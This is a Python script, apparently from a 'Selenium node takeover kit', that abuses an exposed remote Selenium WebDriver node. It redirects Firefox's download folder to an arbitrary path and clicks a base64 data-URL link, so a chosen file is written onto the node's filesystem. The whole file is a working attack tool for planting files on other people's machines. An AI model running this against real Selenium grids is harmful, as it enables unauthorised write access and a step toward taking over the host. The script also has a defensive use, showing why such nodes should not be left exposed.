#!/usr/bin/env python
# https://github.com/JonStratton/selenium-node-takeover-kit/blob/master/examples/selenium_node_upload.py
#
# You can upload a file onto a remote selenium node by changing the download folder and clicking a download link.
# Small files can be encoded and used within url inline html. Larger files should be pulled remotely.
# Limits are 1. the context of the process on the selenium node, 2. it cannot overwrite files, and 3. it doesnt seem to be able to make dot files.

import base64, getopt, sys, os
from selenium import webdriver
from selenium.webdriver.remote.file_detector import UselessFileDetector

def get_driver(url, remote_path):
    # To prevent download dialog
    profile = webdriver.FirefoxProfile()
    profile.set_preference('browser.download.folderList', 2) # custom location
    profile.set_preference('browser.download.manager.showWhenStarting', False)
    profile.set_preference('browser.download.dir', remote_path)
    profile.set_preference('browser.helperApps.neverAsk.saveToDisk', 'application/octet-stream')

    options = webdriver.FirefoxOptions()
    options.profile = profile

    driver = webdriver.Remote(
            command_executor=url,
            desired_capabilities=options.to_capabilities()
            )
    return driver

def parse_args():
    url_wd, remote_file, local_file, data = None, None, None, None
    myopts, args = getopt.getopt(sys.argv[1:],':r:u:l:d:')
    for o, a in myopts:
        if o == '-u':
            url_wd = a
        elif o == '-r':
            remote_file = a
        elif o == '-l':
            local_file = a
        elif o == '-d':
            #data = str.encode(a)
            data = base64.b64encode(str.encode(a))

    return url_wd, remote_file, local_file, data

if __name__ == '__main__':
    url_wd, remote_file, local_file, data = parse_args()

    # Just overwrite whatever is in data
    if local_file:
        with open(local_file, 'rb') as file:
            data = base64.b64encode(file.read())

    remote_path = os.path.dirname(remote_file)
    remote_basename = os.path.basename(remote_file)

    data_url = 'data:text/html;charset=utf-8,<html><a id=f href="data:application/octet-stream;charset=utf-16le;base64,%s" download="%s">f</a></html>' % ( data.decode('utf-8'), remote_basename )

    driver = get_driver(url_wd, remote_path)
    try:
        driver.get(data_url)
        driver.find_element_by_id('f').click()
    finally:
        driver.quit()
    sys.exit(0)
